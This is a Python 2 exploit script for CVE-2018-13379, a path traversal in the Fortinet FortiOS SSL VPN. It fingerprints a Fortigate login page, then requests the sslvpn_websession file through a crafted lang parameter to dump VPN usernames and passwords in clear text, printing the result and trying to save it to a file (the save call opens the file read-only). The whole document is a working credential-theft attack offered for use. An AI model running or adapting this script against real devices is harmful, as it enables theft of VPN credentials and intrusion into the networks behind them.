#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# w4rl0k
# CVE-2018-13379 : FortiOS system file leak
# Allow to view login and password in clear from authentified users

import requests

ip="localhost:10443"

def checkIP(ip):
	try:
		headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
		r=requests.get("https://"+ip+"/remote/login?lang=en", headers=headers, verify=False)
		if r.status_code == 200 and "<title>Please Login</title>" in r.text:
			return True
	except:
		pass
	return False

def viewCreds(ip):
	try:
		r = requests.get("https://"+ip+"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", verify=False)
		if(r.status_code == 200):
			return True
	except:
		pass
	return False

def getCreds(ip):
	try:
		r = requests.get("https://"+ip+"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", verify=False)
		print(r.text) # view creds. Login and password are within the weads caracters.
		open('credsFortigate.txt', 'rb').write(r.content) # save data in file "credsFortigate.txt"
	except:
		pass

def main():
	if checkIP(ip):
		print "[*] Target ["+ip+"] is a Fortigate device"
		if viewCreds(ip):
			print("[*] Target is vulnerable !")
			getCreds(ip)
			print "[*] The data was saved in file [credsFortigate.txt]"
		else:
			print "[*] No creds found"			
	else:
		print "[*] Target ["+ip+"] is not a Fortigate device"

if __name__ == "__main__":
	main()
